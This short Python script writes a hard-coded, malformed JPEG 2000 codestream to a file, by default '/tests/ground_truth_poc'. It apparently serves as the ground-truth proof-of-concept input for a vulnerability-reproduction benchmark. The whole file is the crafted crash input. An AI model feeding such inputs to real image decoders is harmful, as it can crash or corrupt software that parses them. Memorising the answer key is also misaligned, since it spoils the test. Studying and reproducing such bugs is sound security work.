#!/usr/bin/env python3
import binascii,sys
POC_HEX=(
    "ff4fff51002f00020000000c0000000c000000000000000200000003000000030000000000000000"
    "00030f01010901010f2101ff52000c06040001010404032800ff5c00040000ff5f001000e0b59e94"
    "a2010a0121ff2d3037ff90000a0000000000000061ff932a3ec0"
)
open(sys.argv[1] if len(sys.argv)>1 else "/tests/ground_truth_poc","wb").write(binascii.unhexlify("".join(POC_HEX.split())))
